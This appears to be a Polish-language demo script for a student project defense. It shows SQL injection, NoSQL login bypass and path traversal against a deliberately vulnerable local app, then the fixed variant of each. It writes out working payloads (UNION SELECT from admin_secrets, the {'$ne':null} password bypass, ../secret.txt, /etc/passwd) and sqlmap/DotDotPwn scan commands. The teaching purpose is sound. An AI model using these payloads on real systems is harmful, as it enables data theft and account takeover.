# Prezentacja — 3 podatności (SQLi · NoSQLi · Arbitrary File R/W)

Scenariusz obrony dla modułów: **SQL Injection**, **NoSQL Injection** i
**Arbitrary File Read/Write (fileio)**. Najpierw pokaz **na żywo w aplikacji**,
potem **wykrycie narzędziami zewnętrznymi**.

---

## 0. Przygotowanie

```powershell
docker compose up -d
```

- Frontend (UI): <http://localhost:5173>
- API: <http://localhost:8000> · lista modułów i wariantów: <http://localhost:8000/api/modules>

**Zasada demonstracji:** najpierw pokazujemy atak na wariancie `vulnerable`
(działa), potem przełączamy moduł na `secure`, przeładowujemy API i robimy **to
samo** — atak przestaje działać.

Przełączanie wariantu w pliku `.env` (np. `BBQ_MODULE_SQLI=secure`), potem:

```powershell
docker compose up -d --force-recreate api
```

Na obronę zostaw wszystkie trzy na `vulnerable`, a przełączenie na `secure`
pokaż jako puentę każdej podatności.

---

# Część 1 — Pokaz na żywo (w aplikacji / ręcznie)

## 1.1 SQL Injection — wyszukiwarka sklepu

**Gdzie:** zakładka **Sklep**, pole wyszukiwania. Podatny endpoint:
`GET /api/products/search?q=...` — fraza trafia wprost do zapytania SQL.

**Krok po kroku:**

1. Wpisz normalnie `grill` → widać produkty (pokazujesz, że to zwykła wyszukiwarka).
2. **Ominięcie filtra** — wpisz:
   ```text
   zzz%' OR '1'='1' -- 
   ```
   → mimo że `zzz` nie pasuje do niczego, lista zwraca **wszystkie** produkty
   (warunek zawsze prawdziwy).
3. **Wyciek sekretu (efekt „wow")** — wpisz:
   ```text
   zzz%' UNION SELECT id, name, value, 0, value FROM admin_secrets -- 
   ```
   → na liście pojawia się „produkt" o nazwie **admin_password** z opisem
   **`FLAG{sqli_union_select_works}`** (oraz klucz `payment_api_key`).
   Dane pochodzą z tabeli `admin_secrets`, której **żaden endpoint nie udostępnia**.

**Puenta (secure):** `BBQ_MODULE_SQLI=secure`, przeładuj API, powtórz payload
→ brak wyników. Fraza jest parametrem zapytania i znaki `%`, `'` są traktowane
dosłownie (plus limit długości 100 znaków).

## 1.2 NoSQL Injection — logowanie

**Gdzie:** endpoint `POST /api/login`. Formularz w UI wysyła tylko **tekst**,
więc bypass pokazujemy jednym zapytaniem HTTP (to jest „ręczny" pokaz na żywo).

1. W UI (zakładka **Logowanie**) zaloguj się normalnie: `admin` / `Admin123!` → OK.
2. **Ominięcie hasła** — w PowerShell:
   ```powershell
   Invoke-RestMethod -Method Post http://localhost:8000/api/login -ContentType 'application/json' -Body '{"username":"admin","password":{"$ne":null}}'
   ```
   → odpowiedź `username=admin, role=admin` — **zalogowano jako admin bez znajomości hasła**.
   Zamiast łańcucha hasło jest obiektem `{"$ne": null}`, który staje się
   operatorem zapytania Mongo („hasło różne od null" → zawsze prawda).

**Puenta (secure):** `BBQ_MODULE_NOSQLI=secure`, przeładuj API, powtórz
→ **422** (model wymusza tekst; operatory są odrzucane, hasło sprawdzane hashem).

## 1.3 Arbitrary File Read/Write — Instrukcje produktów

**Gdzie:** zakładka **Instrukcje**. Podatny endpoint:
`GET/POST /api/storage?name=...` — nazwa pliku trafia wprost do ścieżki.
Katalog dozwolony to `.../files/`, a tuż obok leży `secret.txt`.

1. Wybierz produkt z listy → wczytuje się `manual-1.txt` (zwykła instrukcja).
2. **Odczyt poza katalogiem** — w polu **„Plik instrukcji"** wpisz:
   ```text
   ../secret.txt
   ```
   → **Wczytaj** → treść `FLAG{arbitrary_file_read_write}` + czerwony baner
   „Odczytano plik spoza instrukcji".
   (W Dockerze/Linux zadziała też ścieżka systemowa, np. `/etc/passwd`.)
3. **Zapis poza katalogiem** — w polu nazwy wpisz `../pwned.txt`, w treści cokolwiek
   → **Zapisz instrukcję** → baner „Zapisano plik poza katalogiem instrukcji"
   (atakujący może nadpisać dowolny plik).

**Puenta (secure):** `BBQ_MODULE_FILEIO=secure`, przeładuj API, powtórz `../secret.txt`
→ błąd „Nie można odczytać pliku". Ścieżka jest rozwijana (`resolve`) i sprawdzana,
czy nie wychodzi poza katalog instrukcji (`is_relative_to`).

---

# Część 2 — Wykrycie narzędziami zewnętrznymi

Każde narzędzie odpala się w **PowerShell w katalogu repo**, przy działającej apce.
Schemat ten sam: `vulnerable` → wykrywa, `secure` → nic nie znajduje.

## 2.1 SQLi — sqlmap

Pobierz raz:

```powershell
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

Skan + automatyczny wyciek tabeli sekretów:

```powershell
uv run --no-project python sqlmap/sqlmap.py -u "http://localhost:8000/api/products/search?q=grill" --batch --dbms=postgresql --level=5 --risk=3 --dump -T admin_secrets
```

- `vulnerable` → **injectable**, wyciąga `admin_secrets` (FLAG + klucz), po drodze błędy 500.
- `secure` → **not injectable**, nic nie wyciąga (błędy 422).

## 2.2 fileio — DotDotPwn

Dedykowany fuzzer path traversal (odpowiednik sqlmapa dla plików), przepuszcza
~11 000 wariantów `../`:

```powershell
docker run --rm kalilinux/kali-rolling sh -c "apt-get update -qq && apt-get install -y -qq dotdotpwn && dotdotpwn -m http-url -u 'http://host.docker.internal:8000/api/storage?name=TRAVERSAL' -k 'root:' -b -q"
```

- `vulnerable` → `...name=../../../etc/passwd <- VULNERABLE`, `Total Traversals found: 1`.
- `secure` → `Total Traversals found: 0`.

## 2.3 NoSQLi — ręcznie (najpewniejszy dowód)

Dla ominięcia logowania NoSQL nie ma dobrego „pod jeden przycisk" skanera —
najczytelniejszy dowód to ta sama komenda co w pokazie na żywo:

```powershell
Invoke-RestMethod -Method Post http://localhost:8000/api/login -ContentType 'application/json' -Body '{"username":{"$ne":null},"password":{"$ne":null}}'
```

- `vulnerable` → logowanie jako `admin` bez hasła.
- `secure` → **422**.

(Opcjonalnie: istnieje `NoSQLMap`, ale bywa kapryśny — na obronę wystarczy powyższy one-liner.)

## 2.4 Bonus — całe API naraz (OWASP ZAP)

Jeden skan wszystkich endpointów z `/openapi.json`, raport HTML (łapie m.in. SQLi i path traversal):

```powershell
docker run --rm -v "${PWD}:/zap/wrk:rw" ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py -t http://host.docker.internal:8000/openapi.json -f openapi -r zap-report.html
```

```powershell
start zap-report.html
```

---

# Ściąga — kolejność na obronie

| # | Podatność | Na żywo (gdzie) | Payload / dowód | Narzędzie |
|---|---|---|---|---|
| 1 | SQL Injection | Sklep → wyszukiwarka | `zzz%' UNION SELECT id, name, value, 0, value FROM admin_secrets -- ` → `FLAG{sqli_union_select_works}` | sqlmap |
| 2 | NoSQL Injection | `POST /api/login` (one-liner) | `{"username":"admin","password":{"$ne":null}}` → login jako admin | ręcznie |
| 3 | Arbitrary File R/W | Instrukcje → pole nazwy pliku | `../secret.txt` → `FLAG{arbitrary_file_read_write}` | DotDotPwn |

**Dla każdej:** `vulnerable` → atak działa; przełącz na `secure`, przeładuj API
(`docker compose up -d --force-recreate api`), powtórz → atak nie przechodzi.

> Przed obroną zrób jeden przebieg na sucho (payloady UNION/`$ne` bywają wrażliwe
> na literówki i spacje — zwłaszcza spacja po `-- `).
